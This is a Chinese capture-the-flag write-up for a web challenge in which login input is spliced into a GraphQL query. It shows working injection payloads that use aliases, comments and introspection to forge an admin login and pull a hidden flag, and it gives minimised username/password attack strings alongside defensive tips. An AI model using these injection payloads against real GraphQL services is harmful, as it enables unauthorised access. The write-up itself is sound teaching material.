# [Web] 统一身份认证

- 命题人：ouuan
- Flag 1】并抢了【你的：200 分
- Flag 2】并抢了【你的：200 分

## 题目描述

<div class="graphauth-container">
<p style="text-indent:0">各单位，各位师生：</p>
<p>为贯彻落实学校数字化转型总体部署，全面提升校园信息化建设水平，推动数据资源整合与服务一体化管理，经学校批准，华清大学统一身份认证系统已于今日正式上线运行。</p>
<p>本系统采用鉴权逻辑分离架构，引入<strong><span style="margin-right:0.25em"></span>GraphQL<span style="margin-right:0.25em"></span></strong>技术支撑，实现了接口灵活调用与高效安全认证，标志着我校信息化基础设施建设进入新阶段。系统上线后，将有效解决多系统重复登录、权限管理割裂等历史遗留问题，为全校师生提供安全、便捷、统一的数字身份服务。</p>
<p>信息化中心负责人指出，统一身份认证系统的启用，是我校构建智慧校园、完善信息安全体系的重要举措。中心将持续优化系统性能，加强数据安全防护与用户隐私管理，确保账户信息得到最严格的保护。</p>
<p>各单位要高度重视本次系统切换与使用工作，及时完成本单位用户账户激活与权限核对，保障教学、科研及管理业务平稳运行。对实施过程中出现的问题，请及时向信息化中心反馈。</p>
<p>特此通知。</p>
<div style="display: flex; justify-content: flex-end;">
<div style="display: flex; flex-direction: column; align-items: center;">
<span>华清大学信息化中心</span>
<span>2025年10月18日</span>
</div>
</div>
</div>
<p><strong>提示：</strong></p>
<ul>
<li>附件为<strong>部分</strong>题目源码，不包含 <code>secret_handler.py</code>、<code>secret.gql</code> 等文件。</li>
<li>用户输入会被拼接在 GraphQL 查询中。可以 <a target="_blank" rel="noopener noreferrer" href="https://graphql.cn/learn/queries/">看看 GraphQL 都能干什么</a>。</li>
<li><strong>每次启动题目都会</strong>生成一个随机的 GraphQL Schema，其中暗藏着 <code>flag2</code> 字段。<a target="_blank" rel="noopener noreferrer" href="/service/attachment/web-graphauth/web-graphauth-secret.gql">新增的附件</a> 是一个例子，供参考。</li>
<li>输入密码的长度限制已从 256 调整为 400。</li>
</ul>
<div class="well">
<p><strong>第二阶段提示：</strong></p>
<ul>
<li>Flag 1: 你需要使用别名（alias）来构造查询，可重复查询同一字段而返回为不同名称，并利用注释辅助注入。</li>
<li>Flag 2: 你需要使用内省（introspection）来获取 schema，且只需要一次查询就能获取整个 schema。</li>
<li>题目服务不会返回错误信息，如果查询失败，你可以尝试修改代码后在本地进行测试来观察报错。语法错误很容易在本地测试发现，而如果本地测试不报错，则可能是询问的字段有误。</li>
</ul>
</div>

**【网页链接：访问题目网页】**

**[【附件：下载部分题目源码（web-graphauth.zip）】](attachment/web-graphauth.zip)**

**[【附件：下载示例 GraphQL Schema（web-graphauth-secret.gql）】](attachment/web-graphauth-secret.gql)**

## 预期解法

[出题人博客](https://ouuan.moe/post/2025/10/geekgame-2025-graphauth-ransomware#统一身份认证)

完整脚本见 [sol.py](./sol/sol.py)（这个是纯自动的，包含下面提到的多种做法，实际做不需要纯自动，比如可以手动得到 flag 询问路径）：

### Flag 1

在登录和注册时，直接将用户输入拼接在了 GraphQL 查询中，用引号就可以闭合字符串进行注入。

```python
query = f'''
query ($username: String = "{username}", $password: String = "{password}") {{
  login(username: $username, password: $password) {{
    ok
    isAdmin
    username
  }}
}}
'''
```

攻击目标是返回 `"login": { "ok": true, "isAdmin": true, "username": "xxx" }`，而查询中本来有的这个 `login` 没法篡改，只能注入一个新的 `login`。代码中检查 `ok` 时只需要 truthy 即可，而检查 `isAdmin` 时写的是 `== True`，所以必须是 `true`，而能够返回 `true` 的除了 `isAdmin` 只有 `ok`，通过 [alias](https://graphql.org/learn/queries/#aliases)，可以让返回值中的 `isAdmin` 字段放 `ok` 的值。


```graphql
query ($username: String = "username", $password: String = "password") {
  login(username: $username, password: $password) {
    ok
    isAdmin: ok
    username
  }") {
  login(username: $username, password: $password) {
    ok
    isAdmin
    username
  }
}
```

此时还需要处理掉查询语句中的 `") {` 以及原有的这个 `login`。`") {` 通过注释 `#` 就可以处理。原有的 `login` 会造成重复而出错，给一个 alias 就行：

```graphql
query ($username: String = "username", $password: String = "password") {
  login(username: $username, password: $password) {
    ok
    isAdmin: ok
    username
  }
  original: #") {
  login(username: $username, password: $password) {
    ok
    isAdmin
    username
  }
}
```

> [!TIP]
> 就像在 SQL 中应当使用 prepared statement，在 GraphQL 中也应当使用 [variable](https://graphql.org/learn/queries/#variables) 来传递数据，而不应将用户输入直接拼接在查询中。

### Flag 2

schema 是未知的，要拿到 flag 就需要先获取 schema。GraphQL 提供了 [introspection](https://graphql.org/learn/introspection/) 功能，可以通过 GraphQL query 来查询 schema。

GraphQL introspection 有三个主要方法：

-   在任何地方都可以问 `__typename` 得到类型名
-   在 `Query` 可以问 `__type(name: "Type")` 获取特定类型的 schema
-   在 `Query` 可以问 `__schema` 获取整个 schema

通过 `__schema { types { ... } }` 就可以一次性获取整个 schema 中需要的信息：

```graphql
login: __schema {
  ok: __typename
  isAdmin: __typename
  username: types {
    name
    fields {
      name
      type {
        name
      }
    }
  }
}
```

而由于 flag 藏的不是特别深，也可以一层层问下去：

```graphql
__type(name: "Secret") {
  ok: name
  isAdmin: name
  username: fields {
    name
    type {
      name
      fields {
        name
        type {
          name
          fields {
            name
            type {
              name
              fields {
                name
                type {
                  name
                  fields {
                    name
                    type {
                      name
                      fields {
                        name
                        type {
                          name
                          fields {
                            name
                            type {
                              name
                              fields {
                                name
                                type { name }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

拿到 schema 之后，就可以查询 flag 了。利用 `login` 中的 `username` 进行回显，需要给 `ok` 和 `isAdmin` 填东西，让 `ok` 为 truthy。如果都查 flag，整个询问太长，无法通过一开始的 256 长度限制，但后来这个限制被放宽了，所以就够了：`secret {{ ok: {query} isAdmin: {query} username: {query} }}`

我有四种询问构造方法可以缩短长度：

-   可以使用 `__typename`：`login: secret {{ ok: __typename isAdmin: __typename username: {query} }}`

-   实际上，观察代码可以发现，如果缺少 `isAdmin` 字段，虽然会返回“登录失败”，但此时 `session['username']` 已赋值，可以拿到回显，所以不需要 `isAdmin` 字段：`login: secret {{ ok: {query} username: {query} }}`

-   可以使用 fragment 把重复的 flag 查询提取出来：
    ```python
    f'''
    login: secret {{
        ok: secret_{xxx} {{ ... i }}
        isAdmin: secret_{xxx} {{ ... i }}
        username: secret_{xxx} {{ ... i }}
      }}
      ... l
    }}
    fragment i on Secret_{yyy} {{
      {inner_query}
    }}
    fragment l on Query {{
        x: #'''
    ```

-   还可以找到最浅的叶子节点（scalar value）代替 flag 放到 `ok` 和 `isAdmin`。根据 schema 的随机生成方式，有 94% 的概率（没算错的话）payload 长度能在 256 以内；如果你非常不幸，可以重开题目。

除了上面这些查询构造方法，还可以在发送 payload 时同时利用 `username` 和 `password`，只不过由于 `username` 长度限制太小，这个优化效果不大：`username` 填 `",$password:String=""){login:#`，`password` 填 `\n{payload}x:#`，可以省下 `){login:`。另外，把 object 放前面 scalar 放后面可以利用大括号省去一个空格。

但这些都是我在开赛后发现有人被卡长度才想到的，一开始根本没意识到这里会卡住（

最短的 payload 只需要 130 字符的 `password`：

```
username = '",$password:String=""){login:#'
password = '\n__schema{ok:__typename username:types{name fields{name type{name}}}}x:#'
username = '",$password:String=""){login:#'
password = '\nsecret{username:secret_EKFB{secret_BUNy{secret_3gjd{secret_695y{secret_DL6P{secret_A1NB{secret_r6H0{flag2}}}}}}}ok:__typename}x:#'
```

这题的 rate limit 主要是用来 ban 掉每次用 `__type(name: "Secret_XXX")` 只查一个类型的单层字段，但如果你每问 200 次就重启一次容器，理论上可以在数十小时内尝试成功（

> [!TIP]
> GraphQL 默认开启 introspection，整个 schema 都是公开的。可以关闭 introspection 功能，但更好的做法是不要让应用的安全性依赖于 schema 的隐蔽性，[security through obscurity](https://en.wikipedia.org/wiki/Security_through_obscurity) 是不好的。

### 彩蛋

这题的 schema 中还有一个彩蛋，本来发现它还比较困难，但给了一个 `secret.gql` 示例其实就容易发现了，但还是没人玩（

```graphql
type NotPartOfChallenge {
  selectOnePresetData(presetKey: String!, XH: String!, KCH: String!): Preset103765749452800
  formParser(status: String!, presetbind: String!, XH: String!, KCH: String!): Preset103765749452800
}

type Preset103765749452800 {
  msg: String
  status: String
  XH: String
  KCH: String
  KSRQ: String
  XNXQ: String
  XF: Int
  KCMC: String
  ZCJ: Int
}
```

THU 三字班以上的同学或许知道这是什么（

```json
{
  "selectOnePresetData": {
    "KCH": "77777777",
    "KCMC": "2025 “京华杯” 信息安全综合能力竞赛",
    "KSRQ": "20251024",
    "XF": 7,
    "XH": "2025019999",
    "XNXQ": "2025-2026-1",
    "ZCJ": -99
  }
}
```
